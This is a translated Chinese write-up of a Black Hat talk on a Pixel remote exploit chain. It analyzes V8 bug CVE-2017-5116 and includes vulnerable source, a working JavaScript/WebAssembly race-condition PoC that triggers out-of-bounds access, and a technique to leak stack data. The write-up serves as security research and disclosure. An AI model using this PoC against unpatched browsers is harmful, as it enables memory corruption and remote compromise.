# Blackhat议题解读 | 赢得ASR奖励计划历史最高奖金的漏洞利用链
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
近年来，Google在减少攻击面和漏洞利用缓解方面做出了很多努力，以加强Android系统的安全性。远程攻破Android手机，尤其是Google的Pixel手机变得越来越困难。
Pixel手机受到多个层次的安全保护，在2017年的Mobile Pwn2Own比赛中，Pixel
是唯一一个没有被攻破的设备，甚至没有选手报名挑战。但是我们的团队发现了一个远程攻击链 –
这是自Android安全奖励（ASR）计划开展以来的首个有效漏洞利用链，它可以远程攻破Pixel手机。我们将漏洞利用链直接报告给了Android安全团队。
由于漏洞的严重程度和我们的详细报告，我们获得了ASR奖励计划史上最高的奖励（112,500美元）。
这篇文章主要讲，我们是如何攻破pixel手机的。
攻破pixel的攻击链，主要有两个漏洞组成：
  * V8引擎漏洞，实现浏览器渲染进程RCE
  * System_server漏洞，实现沙箱逃逸和提权
文章大纲
  * V8引擎漏洞利用
  * System_server漏洞利用
  * 总结
## V8引擎漏洞利用
这一章节，分为三个部分：
  * 介绍SharedArrayBuffer 和 WebAssembly
  * 分析利用链中第一个漏洞—CVE-2017-5116
  * 利用CVE-2017-5116
首先介绍一些基础知识，SharedArrayBuffer 和 WebAssembly。
SharedArrayBuffer 对象用来表示一个通用的、固定长度的二进制缓冲区，和ArrayBuffer相似。V8
6.0版本开始引入SharedArrayBuffer，是一种使JavaScript
workers之间能共享内存的底层的机制。SharedArrayBuffers还解锁了通过asm.js或WebAssembly将线程应用程序移植到Web的功能。
很遗憾，因为Spectre漏洞，从2018年1月开始，主要的浏览器默认都禁用SharedArrayBuffers。后续会不会默认被启用，值得关注。
WebAssembly
是一种新的代码类型，目前几种比较流行的浏览器都支持这种代码。它是一种底层语言，能提供像C/C++一样的性能，能被编译成二进制代码，与JavaScript并行运行。举一个WebAssembly代码的例子，如下：
    var importObject = { imports: { imported_func: arg => console.log(arg) } };
    WebAssembly.instantiateStreaming(fetch('simple.wasm'), importObject)
    .then(obj => obj.instance.exports.exported_func()); 
JavaScript代码能调用simple.wasm文件中导出的函数。
接下来，就开始介绍V8漏洞—CVE-2017-5116，该漏洞在chrome 61.0.3163.79版本被修复。
结合WebAssembly，SharedArrayBuffer 和Web worker
三个特点，通过条件竞争，可以触发一个越界访问bug，也就是该漏洞，触发流程如下：
Worker线程将WebAssembly代码写入SharedArrayBuffer，然后传送给另一个web
worker主线程，当主线程解析WebAssembly代码时，由于共享内存，worker线程此时可以修改此代码，从而造成越界访问问题。下面通过分析漏洞代码，来了解具体的细节。
    i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo& args, ErrorThrower* thrower) {
        ……
    v8::Local source = args[0];
    if (source->IsArrayBuffer()) {
            ……
     } else if (source->IsTypedArray()) {//------> source should be checked if it's backed by a SharedArrayBuffer
        // A TypedArray was passed.
        Local array = Local::Cast(source);
        Local buffer = array->Buffer();
        ArrayBuffer::Contents contents = buffer->GetContents();
        start =
        reinterpret_cast(contents.Data()) + array->ByteOffset();
        length = array->ByteLength();
     }
        ……
    if (thrower->error()) return i::wasm::ModuleWireBytes(nullptr, nullptr);
    return i::wasm::ModuleWireBytes(start, start + length);
    } 
漏洞发生在V8代码的wasm部分的GetFirstArgumentAsBytes函数，参数args可能是ArrayBuffer或者是TypedArray对象。当SharedArrayBuffer引入JavaScript之后，便可以被用来支撑TypedArray。代码中72行只是检查了souce是否是TypedArray，而没有检查是由SharedArrayBuffer作底层支持。这样一来，
TypedArray的内容随时可以被其他线程修改，而后续的解析操作，将会触发漏洞。
使用一个简单的PoC来说明如何触发漏洞。
    poc
    worker:{
        if (typeof window 
    === 'object') break worker; // Bail if we're not a Worker
        self.onmessage = function(arg) {
          //%DebugPrint(arg.data);
          console.log("worker started");
          var ta = new Uint8Array(arg.data);
          //%DebugPrint(ta.buffer);
          var i =0;
          while(1){
            if(i==0){
              i=1;
              ta[51]=0; //------>4)modify the webassembly code at the same time
            }else{
              i=0;
              ta[51]=128;
            }
          }
        }
    function getSharedTypedArray(){
    var wasmarr = [
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
    0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
    0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
    0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
    0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
    0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];
    var sb = new SharedArrayBuffer(wasmarr.length);
    //---> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i 2)create a web worker
    var sta = getSharedTypedArray();
    worker.postMessage(sta.buffer);
    //--->3)pass the WebAssembly code to the web worker
    setTimeout(function(){
    while(1){
        try{
            sta[51]=0;
            var myModule = new WebAssembly.Module(sta); //--->4)parse the WebAssembly code
            var myInstance = new WebAssembly.Instance(myModule);
            //myInstance.exports.getAnswerPlus1();
        }catch(e){
    }
    }
    },1000);
    //worker.terminate();
PoC中，worker1线程，修改WebAssembly代码，ta[51]改为128。
来看看另外一个线程，将WebAssembly写入SharedArrayBuffer，然后创建一个TypedArray数组sta，并且使用SharedArrayBuffer作为buffer。然后创建线程worker1，并且把SharedArrayBuffer传入worker1线程。当主线程在解析WebAssembly代码的时候，worker1线程修改了代码。worker1线程修改了什么代码？会造成什么影响呢？来看看PoC中WebAssembly
code 的反汇编代码。
worker1线程将”call 0” 指令改为”call 128”，与此同时主线程解析并编译此代码，从而引发OOB访问。
”call 0”指令可以被修改为调用任意wasm函数，如将”call 0”改为”call $leak”，如下：
通过$leak代码可以看出，寄存器和栈上的内容都会被dump到WebAssembly 内存中，由于指令”call 0”和”call
$leak”所调用的函数参数不同，这将导致栈上很多有用的数据被泄露。
不仅仅”call 0”指令可有被修改，任何”call funcX”指令均可以被修改，如下：
    /*Text format of funcX*/
    (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)
    get_local 5
    get_local 4
    i32.add)
    /*Disassembly code of funcX*/
    --- Code ---    kind = WASM_FUNCTION
    name = wasm#1
    compiler = turbofan
    Instructions (size = 20)
    0x58f87600 0 8b442404 mov eax,[esp+0x4]
    0x58f87604 4 03c6 add eax,esi
    0x58f87606 6 c20400 ret 0x4
    0x58f87609 9 0f1f00 nop